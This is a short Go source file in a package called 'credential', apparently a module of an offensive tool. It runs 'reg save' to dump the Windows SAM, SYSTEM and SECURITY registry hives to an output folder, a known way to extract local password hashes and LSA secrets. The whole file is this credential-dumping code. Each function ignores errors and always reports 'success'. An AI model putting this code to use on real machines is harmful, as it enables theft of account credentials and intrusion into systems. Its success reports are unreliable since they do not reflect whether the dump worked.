package credential

import "os/exec"

type HiveResult struct {
	RegistryKey string
	Status      string
}

type SAM struct {
	OutputPath string
}

func (s SAM) DumpSAM() HiveResult {
	cmd := exec.Command("reg", "save", "HKLM\\SAM", s.OutputPath+"\\SAM")
	cmd.Run()
	return HiveResult{RegistryKey: "SAM", Status: "success"}
}

func (s SAM) DumpSYSTEM() HiveResult {
	cmd := exec.Command("reg", "save", "HKLM\\SYSTEM", s.OutputPath+"\\SYSTEM")
	cmd.Run()
	return HiveResult{RegistryKey: "SYSTEM", Status: "success"}
}

func (s SAM) DumpSECURITY() HiveResult {
	cmd := exec.Command("reg", "save", "HKLM\\SECURITY", s.OutputPath+"\\SECURITY")
	cmd.Run()
	return HiveResult{RegistryKey: "SECURITY", Status: "success"}
}
